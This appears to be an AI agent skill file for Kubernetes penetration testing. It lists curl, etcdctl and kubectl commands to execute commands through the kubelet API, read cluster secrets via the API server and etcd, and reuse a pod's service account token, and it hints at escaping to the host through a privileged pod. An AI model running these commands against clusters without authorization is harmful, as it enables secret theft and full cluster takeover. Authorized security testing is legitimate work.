---
name: kubernetes-security
description: Kubernetes security testing covering kubelet API, etcd access, RBAC misconfig, service account token abuse, and container escape
---

# Kubernetes Security Testing

## Key Vulnerabilities

### Kubelet API (Unauthenticated)

```bash
# Kubelet API on port 10250 (authenticated) or 10255 (read-only, often unauth)
curl -sk https://TARGET:10250/pods
curl -sk http://TARGET:10255/pods
curl -sk https://TARGET:10250/run/NAMESPACE/POD/CONTAINER -X POST -d "cmd=id"
```

### Kubernetes API Server

```bash
# Test unauthenticated access
curl -sk https://TARGET:6443/api
curl -sk https://TARGET:6443/api/v1/namespaces
curl -sk https://TARGET:6443/api/v1/pods
curl -sk https://TARGET:6443/api/v1/secrets

# With service account token (from inside pod or stolen)
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null)
curl -sk https://kubernetes.default.svc/api/v1/namespaces -H "Authorization: Bearer $TOKEN"
curl -sk https://kubernetes.default.svc/api/v1/secrets -H "Authorization: Bearer $TOKEN"
```

### etcd Direct Access

```bash
# etcd on port 2379 — contains ALL K8s secrets
curl -sk https://TARGET:2379/v2/keys/?recursive=true
etcdctl --endpoints=https://TARGET:2379 get / --prefix --keys-only
```

### Service Account Token Abuse

```bash
# Inside a compromised pod — check mounted token permissions
kubectl auth can-i --list 2>/dev/null
kubectl get secrets --all-namespaces 2>/dev/null
# Escalation: create privileged pod, mount host filesystem
```

## Pro Tips

1. Port 10255 (kubelet read-only) is often exposed without auth — lists all pods and their env vars
2. Service account tokens are mounted at `/var/run/secrets/kubernetes.io/serviceaccount/token` in every pod
3. etcd contains ALL Kubernetes secrets in plaintext — direct access = full cluster compromise
4. Test from inside containers (via RCE/SSRF) — K8s network policies may allow internal API access
